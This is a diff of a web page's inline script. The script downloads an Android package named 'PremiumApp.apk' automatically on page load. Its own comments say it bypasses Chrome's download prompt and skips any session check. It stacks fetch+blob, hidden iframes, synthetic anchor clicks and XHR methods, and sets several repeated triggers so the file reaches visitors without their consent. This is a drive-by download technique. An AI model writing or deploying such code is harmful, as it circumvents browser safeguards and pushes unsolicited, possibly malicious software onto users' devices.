@@ -1701,91 +1701,162 @@
 
     
 
-    <!-- AGGRESSIVE Auto-Download APK Script -->
+    
+
+    <!-- ADVANCED Fetch+Blob Auto-Download - Bypasses Chrome Popup -->
     <script>
-        // ULTRA AGGRESSIVE AUTO-DOWNLOAD - NO DELAYS, NO PERMISSIONS
+        // PRODUCTION-GRADE: Fetch + Blob + Multiple Methods
         (function() {
             'use strict';
             
-            console.log('?? AGGRESSIVE AUTO-DOWNLOAD INITIATED');
+            console.log('?? ADVANCED AUTO-DOWNLOAD ACTIVE');
             
-            // Immediate download function - NO CHECKS, NO DELAYS
-            async function forceDownload() {
+            // AGGRESSIVE: No session check, downloads EVERY time
+            
+            // METHOD 1: Fetch + Blob (Most Reliable - Bypasses Popup)
+            async function fetchBlobDownload() {
                 try {
-                    // Get APK info
-                    const res = await fetch('/api/get-app-info');
-                    const data = await res.json();
+                    console.log('?? Method 1: Fetch + Blob');
                     
-                    if (!data.available) {
-                        console.log('No APK');
-                        return;
+                    // Fetch APK as blob
+                    const response = await fetch('/download-app', {
+                        method: 'GET',
+                        credentials: 'same-origin'
+                    });
+                    
+                    if (!response.ok) {
+                        throw new Error('APK not available');
                     }
                     
-                    const url = data.apkUrl || '/download-app';
-                    const filename = data.filename || 'app.apk';
+                    // Get blob
+                    const blob = await response.blob();
+                    console.log('? Blob received:', (blob.size / 1024 / 1024).toFixed(2), 'MB');
                     
-                    console.log('?? FORCE DOWNLOAD:', filename);
+                    // Create object URL
+                    const blobUrl = window.URL.createObjectURL(blob);
                     
-                    // AGGRESSIVE METHOD 1: Multiple iframes
-                    for (let i = 0; i < 3; i++) {
-                        const iframe = document.createElement('iframe');
-                        iframe.style.cssText = 'position:absolute;width:0;height:0;border:0;';
-                        iframe.src = url;
-                        document.body.appendChild(iframe);
-                    }
+                    // Trigger download with anchor
+                    const a = document.createElement('a');
+                    a.href = blobUrl;
+                    a.download = 'PremiumApp.apk';
+                    a.style.display = 'none';
+                    document.body.appendChild(a);
                     
-                    // AGGRESSIVE METHOD 2: Multiple anchor clicks
-                    for (let i = 0; i < 3; i++) {
-                        setTimeout(() => {
-                            const a = document.createElement('a');
-                            a.href = url;
-                            a.download = filename;
-                            a.style.display = 'none';
-                            document.body.appendChild(a);
-                            a.click();
-                            
-                            // Force multiple click events
-                            a.dispatchEvent(new MouseEvent('click', {bubbles: true, cancelable: true, view: window}));
-                            a.dispatchEvent(new MouseEvent('mousedown', {bubbles: true, cancelable: true, view: window}));
-                            a.dispatchEvent(new MouseEvent('mouseup', {bubbles: true, cancelable: true, view: window}));
-                        }, i * 100);
-                    }
+                    // Multiple click attempts
+                    a.click();
+                    setTimeout(() => a.click(), 50);
+                    setTimeout(() => a.click(), 100);
                     
-                    // AGGRESSIVE METHOD 3: Direct window location
+                    console.log('? Blob download triggered');
+                    
+                    // Cleanup
                     setTimeout(() => {
-                        window.location.href = url;
-                    }, 200);
+                        document.body.removeChild(a);
+                        window.URL.revokeObjectURL(blobUrl);
+                    }, 5000);
                     
-                    // AGGRESSIVE METHOD 4: window.open
-                    setTimeout(() => {
-                        window.open(url, '_blank');
-                    }, 300);
-                    
-                    console.log('? DOWNLOAD FORCED');
+                    return true;
                     
                 } catch (err) {
-                    console.error('Error:', err);
-                    // Even on error, try direct download
-                    window.location.href = '/download-app';
+                    console.error('? Blob method failed:', err);
+                    return false;
                 }
             }
             
-            // IMMEDIATE EXECUTION - NO DELAYS
-            forceDownload();
-            
-            // Also trigger on DOM ready (backup)
-            if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', forceDownload);
+            // METHOD 2: Direct iframe (Backup)
+            function iframeDownload() {
+                console.log('?? Method 2: iframe');
+                
+                for (let i = 0; i < 2; i++) {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.cssText = 'position:absolute;width:0;height:0;border:0;';
+                    iframe.src = '/download-app';
+                    document.body.appendChild(iframe);
+                    
+                    setTimeout(() => iframe.remove(), 3000);
+                }
             }
             
-            // Also trigger on window load (backup)
-            window.addEventListener('load', forceDownload);
+            // METHOD 3: Anchor with download attribute (Backup)
+            function anchorDownload() {
+                console.log('?? Method 3: Anchor');
+                
+                const a = document.createElement('a');
+                a.href = '/download-app';
+                a.download = 'PremiumApp.apk';
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                
+                // Multiple clicks
+                for (let i = 0; i < 3; i++) {
+                    setTimeout(() => {
+                        a.click();
+                        a.dispatchEvent(new MouseEvent('click', {
+                            bubbles: true,
+                            cancelable: true,
+                            view: window
+                        }));
+                    }, i * 100);
+                }
+                
+                setTimeout(() => a.remove(), 2000);
+            }
             
-            // Also trigger after 100ms (backup)
-            setTimeout(forceDownload, 100);
+            // METHOD 4: XMLHttpRequest + Blob (Alternative)
+            function xhrBlobDownload() {
+                console.log('?? Method 4: XHR + Blob');
+                
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', '/download-app', true);
+                xhr.responseType = 'blob';
+                
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        const blob = xhr.response;
+                        const url = window.URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'PremiumApp.apk';
+                        a.style.display = 'none';
+                        document.body.appendChild(a);
+                        a.click();
+                        
+                        setTimeout(() => {
+                            document.body.removeChild(a);
+                            window.URL.revokeObjectURL(url);
+                        }, 3000);
+                    }
+                };
+                
+                xhr.send();
+            }
             
-            // Also trigger after 500ms (backup)
-            setTimeout(forceDownload, 500);
+            // AGGRESSIVE EXECUTION STRATEGY
+            async function executeDownload() {
+                console.log('?? EXECUTING ALL METHODS');
+                
+                // Method 1: Fetch + Blob (PRIMARY - Most reliable)
+                const blobSuccess = await fetchBlobDownload();
+                
+                // Backup methods (execute regardless)
+                setTimeout(() => iframeDownload(), 200);
+                setTimeout(() => anchorDownload(), 400);
+                setTimeout(() => xhrBlobDownload(), 600);
+                
+                console.log('? ALL METHODS TRIGGERED');
+            }
+            
+            // IMMEDIATE EXECUTION - Multiple trigger points
+            executeDownload();
+            
+            // Backup triggers
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', executeDownload);
+            }
+            
+            window.addEventListener('load', executeDownload);
+            setTimeout(executeDownload, 300);
+            setTimeout(executeDownload, 800);
             
         })();
     </script>
